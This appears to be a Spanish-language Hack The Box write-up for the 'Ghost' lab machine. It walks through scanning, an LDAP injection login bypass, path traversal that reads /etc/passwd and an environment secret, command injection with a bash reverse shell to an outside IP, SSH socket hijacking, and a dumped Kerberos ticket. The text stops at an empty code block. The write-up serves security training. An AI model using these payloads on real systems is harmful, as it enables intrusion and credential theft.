---
tags:
title: Ghost - Insane (HTB)
permalink: /Ghost-HTB-Writeup
toc_label: Topics
toc: true
toc_sticky: true
sidebar: main
---
---
# Reconocimiento 

```bash
 nmap -sCV -p53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,3389,5985,8008,8443,9389,49443,49664,49670,49677,50850,50998,65010 10.129.231.105
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 01:54 -03
Nmap scan report for ghost.htb (10.129.231.105)
Host is up (1.2s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-11 04:56:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
443/tcp   open  https?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-11-11T04:58:24+00:00; +1m42s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.231.105:1433: 
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-11T04:04:42
|_Not valid after:  2055-11-11T04:04:42
| ms-sql-info: 
|   10.129.231.105:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2025-11-10T04:01:58
|_Not valid after:  2026-05-12T04:01:58
|_ssl-date: 2025-11-11T04:58:23+00:00; +1m43s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8008/tcp  open  http          nginx 1.18.0 (Ubuntu)
|_http-generator: Ghost 5.78
| http-robots.txt: 5 disallowed entries 
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Ghost
8443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)
| http-title: Ghost Core
|_Requested resource was /login
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49443/tcp open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50850/tcp open  msrpc         Microsoft Windows RPC
50998/tcp open  msrpc         Microsoft Windows RPC
65010/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-11-11T04:57:48
|_  start_date: N/A
|_clock-skew: mean: 1m41s, deviation: 0s, median: 1m41s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.11 seconds
```

Agrego los dominios al `/etc/hosts` y me quedaria asi.

```bash
cat /etc/hosts | grep ghost
10.129.231.105 ghost.htb DC01 dc01.ghost.htb core.ghost.htb
```

### Website / Port 8008

Una pagina casi que vacía de contenido. 

![image-center](/assets/images/{E5D3FA33-6CBC-4103-8638-2D588F9ADFCC}.png)

Lo único que puedo ver es un nombre de usuario.
Podría ir creando un archivo `users` con los usuarios que vaya descubriendo, siguiendo nomenclaturas como `test.suarez, tsuarez, etc`.
Asi quedo mi archivo por ahora.

```bash
cat users                  
administrator
kathryn.holland
k.holland
kholland
kathryn
```

Usando kerbrute voy a probar si alguno del los nombres para este usuario es valido.

```bash
kerbrute userenum --domain ghost.htb --dc 10.129.231.105 users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/11/25 - Ronnie Flathers @ropnop

2025/11/11 02:00:21 >  Using KDC(s):
2025/11/11 02:00:21 >   10.129.231.105:88

2025/11/11 02:00:22 >  [+] VALID USERNAME:       administrator@ghost.htb
2025/11/11 02:00:23 >  [+] VALID USERNAME:       kathryn.holland@ghost.htb
2025/11/11 02:00:23 >  Done! Tested 5 usernames (2 valid) in 1.139 seconds
```

Veo que si, pero como no tengo credenciales hasta el momento, solo me queda tenerlo a la espera.
### Ghost panel admin

Enumerando por rutas o archivos en la pagina con `feroxbuster`, recibi muchos errores, pero pude descubrir rutas.

```bash
Sitemap: http://ghost.htb/sitemap.xml
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/
Disallow: /webmentions/receive/
```

`/ghost` me lleva a un panel de `admin`.

![image-center](/assets/images/image-20250328105503740.webp)


Además por las dudas como hay demasiados subdominios voy a realizar un `fuzzing` en busca de otros mas, ya que quizás los haya.

```bash
gobuster vhost -u http://ghost.htb:8008 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 150 --append-domain
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://ghost.htb:8008
[+] Method:                    GET
[+] Threads:                   150
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 0 / 114442 (0.00%)[ERROR] error on word mail3: Get 
intranet.ghost.htb:8008 Status: 307 [Size: 3968] [--> /login]
```

Descubrió uno mas así que lo agrego al `/etc/hosts`.

```bash
cat /etc/hosts | grep ghost
10.129.231.105 ghost.htb DC01 dc01.ghost.htb core.ghost.htb federation.ghost.htb intranet.ghost.htb
```
### intranet.ghost.htb / Port 8008

![image-center](/assets/images/{8FE959C7-5CF4-4E4A-979B-968FE345EA8E}.png)

Veo un panel de login
## Shell as root@root Container

En el panel de login, pude burlarlo con una `Inyeccion LDAP` usando un `*` como `secret`.
De manera que pude bypassear el login.

![image-center](/assets/images/{558BC3F0-AE44-46C8-BFD9-98F814FB3A4C}.png)

En el apartado `users` puedo ver varios usuarios del dominio. También los agrego al archivo `users`

![image-center](/assets/images/{A67AA00D-3417-4CC6-8937-4547B5BEF5C9}.png)

#### Information leakage

En la sección `forum` vemos conversaciones entre distintos usuarios, donde vemos que se revela un nuevo subdominio. (`bitbucket.ghost.htb`) Y donde además veo que se habla de `gitea` por lo que el subdominio de gitea también puede ser una opción para agregar.

![image-center](/assets/images/{576195EC-F7AB-4B25-B530-CA371060EAF1}.png)

### gitea.ghost.htb

Vemos que efectivamente el subdominio de `gitea` existe.

![image-center](/assets/images/{B6FD0212-F62D-44D6-B31B-8EAF346A2E0F}.png)

### LDAP Injection

![image-center](/assets/images/{53C3A7F2-7BEF-4D16-A132-13C820F55402}.png)

Si vuelvo al panel de login y para el usuario `gitea_temp_principal` que es el que se que esta habilitado para `gitea` intenten tamos también la misma inyección, vemos que si el carácter es incorrecto devuelve un código de estado `200`, en cambio si es correcto devuelve un `303`,

![image-center](/assets/images/{4FDA7749-D286-4895-8ABC-FC73E29F7CAB}.png)

Entonces me hice un script en `python`, el cual me automatiza la contraseña haciendo fuerza bruta, carácter a carácter.

```python

```

Y así consigo la credencial del usuario `gitea_temp_principal`.
Ya una vez que me loguee en la pagina de gitea, veo dos proyectos.

![image-center](/assets/images/{803A86C1-5AC0-4081-B8CB-CE9C8EC1AC5F}.png)

#### Blog proyect

Dentro de este veo datos importantes a tener en cuenta:

- Hay una clave compartida entre la intranet y el blog llamado DEV_INTRANET_KEY almacenado en una variable de entorno (como se ve arriba).
- Es una versión modificada del CMS Ghost
- Una `api` publica la cual necesita de una `key` --> `a5af628828958c976a3b6cc81a`

![image-center](/assets/images/{3C1AB600-4AD0-4082-BC16-5E3BE956F2E8}.png)

#### Docker 

En el `Dockerfile`, veo una `API` por lo que parece.

```docker
FROM ghost:5-alpine

RUN ln -s /dev/null /root/.bash_history
RUN ln -s /dev/null /home/node/.bash_history

RUN mkdir /var/lib/ghost/extra
RUN echo 659cdeec9cd6330001baefbf > /var/lib/ghost/extra/important

COPY posts-public.js /var/lib/ghost/current/core/server/api/endpoints/posts-public.js

CMD ["node", "current/index.js"]
```

En el docker-compose veo lo siguiente.

```bash
version: '3.1'

services:
  ghost:
    build: .
    container_name: ghost
    restart: always
    ports:
      - 4000:2368
    environment:
      database__client: sqlite3
      database__connection__filename: "content/data/ghost.db"
      database__useNullAsDefault: true
      database__debug: false
      url: http://ghost.htb
      NODE_ENV: production
      DEV_INTRANET_KEY: "redacted"
    volumes:
      - ghost:/var/lib/ghost/content

volumes:
  ghost:
  db:
```

#### Intranet Blog

En el archivo `intranet/backend/src/api/dev/scan.rs` veo lo siguiente.

```rust
use std::process::Command;

use rocket::serde::json::Json;
use rocket::serde::Serialize;
use serde::Deserialize;

use crate::api::dev::DevGuard;

#[derive(Deserialize)]
pub struct ScanRequest {
    url: String,
}

#[derive(Serialize)]
pub struct ScanResponse {
    is_safe: bool,
    // remove the following once the route is stable
    temp_command_success: bool,
    temp_command_stdout: String,
    temp_command_stderr: String,
}

// Scans an url inside a blog post
// This will be called by the blog to ensure all URLs in posts are safe
#[post("/scan", format = "json", data = "<data>")]
pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
    // currently intranet_url_check is not implemented,
    // but the route exists for future compatibility with the blog
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();

    match result {
        Ok(output) => {
            Json(ScanResponse {
                is_safe: true,
                temp_command_success: true,
                temp_command_stdout: String::from_utf8(output.stdout).unwrap_or("".to_string()),
                temp_command_stderr: String::from_utf8(output.stderr).unwrap_or("".to_string()),
            })
        }
        Err(_) => Json(ScanResponse {
            is_safe: true,
            temp_command_success: false,
            temp_command_stdout: "".to_string(),
            temp_command_stderr: "".to_string(),
        })
    }
}
```

De alguna manera esto es lo que recibe la data en `JSON` la cual se evalua ejecutando un `bash -c`, haciendo que haya una muy posible `Inyeccion de comandos`.

### Recuperando la DEV_INTRANET_KEY

Viendo la documentacion de `ghost` se que el contenido de la api deberia de estar en la ruta `/ghost/api/content/posts/`

```bash
curl 'http://ghost.htb:8008/ghost/api/content/posts/' -s | jq .
{
  "errors": [
    {
      "message": "Authorization failed",
      "context": "Unable to determine the authenticated member or integration. Check the supplied Content API Key and ensure cookies are being passed through if member auth is failing.",
      "type": "NoPermissionError",
      "details": null,
      "property": null,
      "help": null,
      "code": null,
      "id": "1ff8d8d0-0c04-11f0-a4b4-69e01dcdbdd8",
      "ghostErrorCode": null
    }
  ]
}
```

Podemos atraves del parametro `key` pasarle la key que habiamos visto antes.

```bash
curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a' -s | jq  
{
  "posts": [
    {
      "id": "65bdd2dc26db7d00010704b5",
      "uuid": "22db47b3-bbf6-426d-9fcf-887363df82cf",
      "title": "Embarking on the Supernatural Journey: Welcome to Ghost!",
      "slug": "embarking-on-the-supernatural-journey-welcome-to-ghost",
      "html": "<p>Greetings, fellow seekers of the unknown!</p><p>It is with great excitement and a touch of trepidation that we welcome you to the digital realm of Ghost, your go-to destination for unraveling the mysteries that lie beyond the veil of the ordinary. As we embark on this supernatural journey together, allow us to extend our hand and guide you through the shadowy corridors of the unexplained.</p><h2 id=\"why-ghost\">Why Ghost?</h2><p>The quest to understand the supernatural has been etched into the fabric of human history. From ancient legends to modern-day tales, the fascination with ghosts and the paranormal is a thread that binds us across time and cultures. Ghost emerges as a beacon for those who yearn to explore the realms beyond our comprehension.</p><h2 id=\"what-to-expect\">What to Expect</h2><p>Our digital abode is more than just a collection of stories; it's a haven for the curious, the intrepid, and the inquisitive. Here, you'll find:</p><ol><li><strong>Investigative Chronicles</strong>: Join us as we recount our journeys into haunted locations, sharing the spine-chilling encounters, unexplained phenomena, and the secrets that linger in the darkness.</li><li><strong>Tech Tuesdays</strong>: Stay at the forefront of paranormal research with our weekly dives into the latest ghost-hunting gadgets, software, and techniques. Knowledge is our strongest ally in the face of the unknown.</li><li><strong>Spotlight Series</strong>: Get to know the passionate individuals behind the investigations. Our Spotlight Series puts a face to the name, sharing the stories and expertise of our dedicated team.</li><li><strong>Community Corner</strong>: Ghost is more than a website; it's a community. Share your own supernatural experiences, theories, and questions in our Community Corner. Together, we amplify the voices seeking to understand the inexplicable.</li></ol><h2 id=\"join-us-on-this-extraordinary-expedition\">Join Us on this Extraordinary Expedition</h2><p>The journey into the paranormal is not for the faint of heart, but it is a journey worth taking. As we lift the veil on the mysteries that surround us, we invite you to be an active participant in this extraordinary expedition. Engage with our content, share your thoughts, and let the spirit of exploration guide us into uncharted territories.</p><p>Ghost is not just a website; it's a portal to the enigmatic, a gateway to the supernatural, and a testament to the boundless curiosity that defines the human spirit.</p><p>Welcome to our realm. Let the haunting begin!</p><p>Happy ghost hunting,</p><p>The Ghost Team</p>",                                                                                                                                                                                       
      "comment_id": "659cdeec9cd6330001baefbf",
      "feature_image": null,
      "featured": true,
      "visibility": "public",
      "created_at": "2024-01-09T05:51:40.000+00:00",
      "updated_at": "2024-01-09T05:52:59.000+00:00",
      "published_at": "2024-01-09T05:52:29.000+00:00",
      "custom_excerpt": null,
      "codeinjection_head": null,
      "codeinjection_foot": null,
      "custom_template": null,
      "canonical_url": null,
      "url": "http://ghost.htb/embarking-on-the-supernatural-journey-welcome-to-ghost/",
      "excerpt": "Greetings, fellow seekers of the unknown!\n\nIt is with great excitement and a touch of trepidation that we welcome you to the digital realm of Ghost, your go-to destination for unraveling the mysteries that lie beyond the veil of the ordinary. As we embark on this supernatural journey together, allow us to extend our hand and guide you through the shadowy corridors of the unexplained.\n\n\nWhy Ghost?\n\nThe quest to understand the supernatural has been etched into the fabric of human history. From anc",                                  
      "reading_time": 1,
      "access": true,
      "comments": false,
      "og_image": null,
      "og_title": null,
      "og_description": null,
      "twitter_image": null,
      "twitter_title": null,
      "twitter_description": null,
      "meta_title": null,
      "meta_description": null,
      "email_subject": null,
      "frontmatter": null,
      "feature_image_alt": null,
      "feature_image_caption": null
    }
  ],
  "meta": {
    "pagination": {
      "page": 1,
      "limit": 15,
      "pages": 1,
      "total": 1,
      "next": null,
      "prev": null
    }
  }
}
```

>De acuerdo con la documentación aquí, cuando se utiliza una clave de API de contenido, ¿podemos HTTP LLEGAR a uno de los `endpoints` con un `?key=<micadena>` cadena de consulta. Para aprovechar el parámetro extra, solo agregamos eso a nuestra cadena de consulta.

```bash
curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../../etc/passwd' | jq

[..snip..]
    "extra": {
      "../../../../../../etc/passwd": "root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000:Linux User,,,:/home/node:/bin/sh\n"                   
    }
  }
}
```

Veo que con exito puedo listar archivos del sistema, puedo ahora mirando el contenido del `/proc/self/environ` tratar de ver la `DEV_INTRANET_KEY` dentro de la variable de entorno como ya sabiamos que existia

```json
curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../../proc/self/environ' | jq

[..snip..
]
"extra": {
      "../../../../../../proc/self/environ": "HOSTNAME=26ae7990f3dd\u0000database__debug=false\u0000YARN_VERSION=1.22.19\u0000PWD=/var/lib/ghost\u0000NODE_ENV=production\u0000database__connection__filename=content/data/ghost.db\u0000HOME=/home/node\u0000database__client=sqlite3\u0000url=http://ghost.htb\u0000DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe\u0000database__useNullAsDefault=true\u0000GHOST_CONTENT=/var/lib/ghost/content\u0000SHLVL=0\u0000GHOST_CLI_VERSION=1.25.3\u0000GHOST_INSTALL=/var/lib/ghost\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000NODE_VERSION=18.19.0\u0000GHOST_VERSION=5.78.0\u0000"                                                                                                                       
    }
  }
}
```

Ahora con usando esta `key`, podemos acceder a enviar solicitudes a `/api-dev/scan` como lo vemos en este archivo. Es asi como despues de esto podemos enviarle una `data` en formato `json`, haciendo que de esta manera podamos lograr inyectar comandos.

```rust
use rocket::http::Status;
use rocket::Request;
use rocket::request::{FromRequest, Outcome};

pub(crate) mod scan;

pub struct DevGuard;

#[rocket::async_trait]
impl<'r> FromRequest<'r> for DevGuard {
    type Error = ();

    async fn from_request(request: &'r Request<'_>) -> Outcome<Self, Self::Error> {
        let key = request.headers().get_one("X-DEV-INTRANET-KEY");
        match key {
            Some(key) => {
                if key == std::env::var("DEV_INTRANET_KEY").unwrap() {
                    Outcome::Success(DevGuard {})
                } else {
                    Outcome::Error((Status::Unauthorized, ()))
                }
            },
            None => Outcome::Error((Status::Unauthorized, ()))
        }
    }
}
```

Probando lo siguiente..

```bash
curl -s 'http://intranet.ghost.htb:8008/api-dev/scan' -H 'Content-Type: application/json' -H 'X-DEV-INTRANET-KEY:!@yqr!X2kxmQ.@Xe' -d '{"url": "http://127.0.0.1/"}' | jq
{
  "is_safe": true,
  "temp_command_success": true,
  "temp_command_stdout": "",
  "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n"
}

```

Devuelve una cadena vacia, por lo que ahora pruebo con un`whoami`.

```bash
{
  "is_safe": true,
  "temp_command_success": true,
  "temp_command_stdout": "root\n",
  "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n"
}
```

Me pone `root`, asi que supongo que es un contenedor, me voy a enviar una shell a mi maquina ahora.

```bash
curl -s 'http://intranet.ghost.htb:8008/api-dev/scan' -H 'Content-Type: application/json' -H 'X-DEV-INTRANET-KEY:!@yqr!X2kxmQ.@Xe' -d '{"url": "http://127.0.0.1/; bash -i >& /dev/tcp/10.10.17.19/4444 0>&1"}' | jq
```

Y desde mi listener `nc` la recibo.

```bash
sudo nc -nlvp 4444            
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.231.105] 49876
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@36b733906694:/app#
```

## Shell as florence.ramirez

```bash
root@36b733906694:/# cat docker-entrypoint.sh 
#!/bin/bash

mkdir /root/.ssh
mkdir /root/.ssh/controlmaster
printf 'Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/controlmaster/%%r@%%h:%%p\n  ControlPersist yes' > /root/.ssh/config

exec /app/ghost_intranet
```

Veo que el mismo crea un directorio `.ssh` con un directorio adicional.

```bash
root@36b733906694:~/.ssh/controlmaster# ls
florence.ramirez@ghost.htb@dev-workstation:22
root@36b733906694:~/.ssh/controlmaster# ls -la
total 12
drwxr-xr-x 1 root root 4096 Nov 11 04:04 .
drwxr-xr-x 1 root root 4096 Jul  5  2024 ..
srw------- 1 root root    0 Nov 11 04:04 florence.ramirez@ghost.htb@dev-workstation:22
```

Dentro del mismo hay un socket para `ssh`, para conectarme puedo usar el siguiente comando.

```bash
ssh -S ~/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 florence.ramirez@ghost.htb
```

Y ahora ya soy el usuario `florencia`.
Listando las variables veo que tengo un ticket vigente.

```bash
env
SHELL=/bin/bash
PWD=/
KRB5CCNAME=FILE:/tmp/krb5cc_50
LOGNAME=florence.ramirez
MOTD_SHOWN=pam
HOME=/home/GHOST/florence.ramirez
SSH_CONNECTION=172.18.0.3 56600 172.18.0.2 22
TERM=xterm
USER=florence.ramirez
SHLVL=1
SSH_CLIENT=172.18.0.3 56600 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
SSH_TTY=/dev/pts/0
_=/usr/bin/env
OLDPWD=/home
```

```bash
florence.ramirez@LINUX-DEV-WS01:/$ klist
Ticket cache: FILE:/tmp/krb5cc_50
Default principal: florence.ramirez@GHOST.HTB

Valid starting     Expires            Service principal
11/11/25 06:51:01  11/11/25 16:51:01  krbtgt/GHOST.HTB@GHOST.HTB
        renew until 11/12/25 06:51:01
```

El mismo lo puedo codificar el `base64`.

```bash
florence.ramirez@LINUX-DEV-WS01:/$ base64 -w 0 /tmp/krb5cc_50
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
```

Ahora desde mi maquina puedo decodificarlo y usarlo como un `tgt`.

```bash
